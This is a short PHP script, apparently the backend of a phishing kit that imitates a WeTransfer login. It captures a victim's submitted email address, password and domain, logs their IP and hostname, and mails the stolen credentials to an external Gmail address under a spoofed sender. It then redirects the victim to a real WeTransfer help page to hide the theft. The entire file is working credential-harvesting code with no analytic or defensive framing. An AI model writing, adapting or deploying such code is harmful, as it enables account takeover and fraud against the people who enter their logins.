<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ YG LOGS ]+==================\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain : ".$_POST['domain']."\n";

$message .= "=============+ [ 2K21 ] +=============\n";

$send= "factures365@gmail.com";

$subject = "LOGS | BLESS UP 2K121 | $ip";
$headers = "From:  2K21<ahmednasir@cisco.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location: https://wetransfer.zendesk.com/hc/en-us/articles/204962246-I-forgot-my-password");
?>